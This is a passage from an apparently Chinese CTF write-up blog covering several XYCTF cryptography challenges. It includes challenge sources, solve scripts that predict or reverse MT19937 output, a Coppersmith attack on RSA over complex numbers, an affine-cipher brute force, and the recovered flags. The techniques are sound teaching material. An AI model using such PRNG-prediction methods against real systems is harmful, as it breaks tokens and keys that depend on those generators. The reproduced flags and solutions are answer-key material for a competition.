    correct_ans = rand1 // rand2</span><br><span class="line">            <span class="keyword">if</span> correct_ans == <span class="built_in">int</span>(ans):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;WOW&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Here is your flag: <span class="subst">&#123;f.read()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;NOPE, the correct answer is <span class="subst">&#123;correct_ans&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid choice&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>MT19937</strong>，令<strong>分母</strong>为1，连续获得<strong>624轮随机数</strong>，再预测<code>rand1 rand2</code>即可得到<code>flag</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.94.15.198&quot;</span>, <span class="number">20491</span>)</span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">624</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    a = <span class="built_in">str</span>(p.recvline().decode()).split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(a))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">rand1 = rc.predict_getrandbits(<span class="number">11000</span>)</span><br><span class="line">rand2 = rc.predict_getrandbits(<span class="number">10000</span>)</span><br><span class="line">ans = rand1 // rand2</span><br><span class="line">p.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Here is your flag: &#x27;</span>)</span><br><span class="line">flag = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-1364b443a5f502f55274afa666827bdd_1440w.png?source=d16d100b" alt=""></p><h2 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h2><blockquote><p>As everyone knows, a check-in challenge shouldn’t look too much like a check-in. So, this is a simple partial m leakage in RSA—but then again, it doesn’t seem like just a simple partial m leakage in RSA.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = complex_pow(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line"><span class="string">mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]</span></span><br><span class="line"><span class="string">C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]</span></span><br><span class="line"><span class="string">enc = b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>复数域</strong>下的<strong>明文高位泄露</strong>，<a href="https://tangcuxiaojikuai.xyz/post/146254b2.html">去年</a>就开始玩复数了，这里的话可以打<strong>二元copper</strong>，这里也是直接套用<strong>小鸡块师傅</strong>的脚本，其实跟一元相差不大</p><p><code>bound</code>为两个根的上界，<code>m</code>为移位，<code>d</code>为多项式中的最高幂</p><p>$C\equiv(m_re+m_im<em>i)^{3}\%n$<br>$m_re=mh_re+x$<br>$m_im=mh_im+y$<br>$C_re\equiv(mh_re+x)^{3}-3</em>(mh_re+x)<em>(mh_im+y)^{2}\%n$<br>$C_im\equiv3</em>(mh_re+x)^{2}*(mh_im+y)-(mh_im+x)^{3}\%n$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">mh = </span><br><span class="line">C = </span><br><span class="line">enc = <span class="string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line">mh_re, mh_im = mh</span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mh_re + x)**<span class="number">3</span> - <span class="number">3</span>*(mh_re + x)*(mh_im + y)**<span class="number">2</span> - C[<span class="number">0</span>]</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">128</span>,<span class="number">2</span>^<span class="number">128</span>), m=<span class="number">2</span>, d=<span class="number">3</span>)</span><br><span class="line">m_re = mh_re + <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">m_im = mh_im + <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">flag = ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;</span></span><br></pre></td></tr></table></figure><h2 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h2><blockquote><p>I’ve invented a new random number generation algorithm, and I believe it’s secure enough to withstand all known attacks!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">r = random.Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            x = self.<span class="built_in">next</span>()</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, a, b</span>):</span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me seed: &#x27;</span>))</span><br><span class="line">prng = PRNG(seed)</span><br><span class="line">a = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">b = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">enc = encrypt(flag, a, b)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><p>怎么说呢，一开始看到<strong>随机数种子</strong>，以为可以搞搞随机数漏洞，发现其实并不是的</p><p>$c_{0}\equiv a<em>m_{0}+b\%p$<br>$c_{1}\equiv a</em>m_{1}+b\%p$<br>$a\equiv (c_{0}-c_{1})<em>(m_{0}-m_{1})^{-1}\%p$<br>$只要GCD(m_{0}-m_{1},p)=1，逆元即存在$<br>$b\equiv c_{0}-a</em>m_{0}\%p$<br>$只需要遍历table^{2}的空间即可，然后注意ab范围，seed随便输$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">34301</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">p = <span class="number">19198111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, mod</span>):</span><br><span class="line">    g, x, y = egcd(a, mod)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(enc)):</span><br><span class="line">            c0 = enc[i]</span><br><span class="line">            c1 = enc[j]</span><br><span class="line">            <span class="keyword">for</span> m0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">                <span class="keyword">for</span> m1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">                    <span class="keyword">if</span> m0 == m1:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    delta_m = m1 - m0</span><br><span class="line">                    delta_c = (c1 - c0) % p</span><br><span class="line">                    inv = modinv(delta_m, p)</span><br><span class="line">                    <span class="keyword">if</span> inv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    a = (delta_c * inv) % p</span><br><span class="line">                    b = (c0 - a * m0) % p</span><br><span class="line">                    <span class="comment"># Check if a and b are within PRNG&#x27;s output range</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= a &lt;= <span class="number">19198100</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= b &lt;= <span class="number">19198100</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    valid = <span class="literal">True</span></span><br><span class="line">                    decrypted = []</span><br><span class="line">                    <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">                        numerator = (c - b) % p</span><br><span class="line">                        inv_a = modinv(a, p)</span><br><span class="line">                        <span class="keyword">if</span> inv_a <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                            valid = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        m = (numerator * inv_a) % p</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= m &lt; <span class="built_in">len</span>(table)):</span><br><span class="line">                            valid = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        decrypted.append(table[m])</span><br><span class="line">                    <span class="keyword">if</span> valid:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;解密失败&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;give me seed: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">114514</span>))</span><br><span class="line">enc = json.loads(io.recvline().decode())</span><br><span class="line">flag = decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的Flag:&quot;</span>, <span class="string">f&#x27;XYCTF&#123;&#123;<span class="subst">&#123;flag&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># 解密后的Flag: XYCTF&#123;114514fixedpointissodangerous1919810&#125;</span></span><br></pre></td></tr></table></figure><h2 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h2><blockquote><p>Before we wrap up, here’s one last easy problem.</p></blockquote><p><code>random.py</code>说实话没什么用</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">rand = Random()</span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里还是<strong>MT19937</strong>，伪随机数算法的缺陷，<strong>2496*8=19968</strong>刚好够一轮<code>state</code>，注意到我们这里需要的是<strong>逆推</strong>上一个<code>state</code>(相当于反向预测吧)</p><p><img src="https://picx.zhimg.com/80/v2-4cd29979ffa498905e34d294cc0fc69a_1440w.png" alt=""><br>所以<code>r</code>需要取反处理一下</p><p>此处借鉴一下<strong>未央师傅</strong>的<code>exp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver</span></span><br><span class="line">sys.path.append(<span class="string">&#x27;MT19937-Symbolic-Execution-and-Solver-master/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line">length = enc.bit_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">r = []</span><br><span class="line">r = [<span class="number">255</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> r]</span><br><span class="line">rng_clone = MT19937(state_from_data = (r, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n//<span class="number">32</span>):</span><br><span class="line">        num = (rng_clone() &lt;&lt; (<span class="number">32</span> * i)) | num</span><br><span class="line">    num = rng_clone() &gt;&gt; (<span class="number">32</span> - (n % <span class="number">32</span>)) &lt;&lt; n//<span class="number">32</span>*<span class="number">32</span> | num</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">rng_clone.reverse_states(length//<span class="number">32</span>+<span class="number">1</span>)  <span class="comment"># 回退到生成前n个随机数之前的状态</span></span><br><span class="line">flag = enc ^^ getrandbits(<span class="number">176</span>-<span class="number">1</span>)    <span class="comment"># 172/8=21.5,22*8=176,可能存在误差所以减1试试</span></span><br><span class="line">flag = <span class="string">b&#x27;XYCTF&#123;&#x27;</span>+long_to_bytes(flag)+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># XYCTF&#123;___0h_51mple_r@nd0m___&#125;</span></span><br></pre></td></tr></table></figure><h2 id="prng-xxxx"><a href="#prng-xxxx" class="headerlink" title="prng_xxxx*"></a>prng_xxxx*</h2><blockquote><p>Why is it called prng_xxxx?Well, to cut costs and improve efficiency, we “laid off” the LFSR. Of course, this means the PRNG now has to do a lot more work—so it’s getting way more salary! XDNote: You can check out prng_lfsr on <a href="https://tangcuxiaojikuai.xyz/post/cb7cb618.html">https://tangcuxiaojikuai.xyz/post/cb7cb618.html</a> for some inspiration.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span 